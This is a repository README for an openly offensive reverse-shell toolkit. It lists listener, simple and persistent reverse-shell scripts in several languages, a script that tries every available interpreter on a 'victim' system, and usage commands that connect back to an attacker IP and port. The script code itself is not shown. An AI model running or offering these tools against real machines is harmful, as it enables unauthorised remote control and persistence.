# Reverse-Shell
 A collection of scripts for creating a reverse shell from a victim machine to connect to an attacker listener.

## Scripts
Attacker Listener script with:
- Netcat (`nc`) `attacker.sh`

Simple Reverse shells in:
- Bash: `reverse.sh`
- Python: `reverse.py`
- PHP: `reverse.php`
- C: `reverse.c`
- JavaScript: `reverse.js`
- Go: `reverse.go`

Persistent Reverse shells in:
- Bash: `reverse_persistent.sh`
- Python: `reverse_persistent.py`

Reverse shell in all available languages and tools on the victim system:
- `reverse_check_all.sh`

Supported Languages/Tools:
- `bash`
- `socat`
- `perl`
- `python2`
- `python3`
- `php`
- `go`
- `nc`
- `ncat`
- `node`
- `gcc`
- `clang`

## Usage
Run every script with the `--help` option (or `-h`), to see the scripts arguments and how to run.

Example for `reverse.py`:
```bash
$ python3 reverse.py -h

usage: reverse.py [-h] IP PORT

Simple Reverse Shell script in Python that connects to a remote machine.

positional arguments:
  IP          IPv4 address of the remote machine
  PORT        Port of the remote machine

optional arguments:
  -h, --help  show this help message and exit
```

### Bash
```bash
bash reverse.sh IP PORT
```

### Python
```bash
python3 reverse.py IP PORT
```

### PHP
```bash
php reverse.php IP PORT
```

### C
```bash
gcc reverse.c -o reverse.out && ./reverse.out IP PORT
# or
clang reverse.c -o reverse.out && ./reverse.out IP PORT
```

### Go
```bash
go run reverse.go IP PORT
```

### JavaScript (Node.js)
```bash
node reverse.js IP PORT
```


## To-Do
- [ ] Add Terminal Colors (Bash, Python)
- [ ] Add functionality to main function
- [ ] Implement for `reverse_check_all.sh`:
    - [ ] `ruby`
    - [ ] `awk`
    - [ ] `pwsh` (Powershell)
    - [ ] `openssl`
- [ ] Add more persistent scripts for other languages.
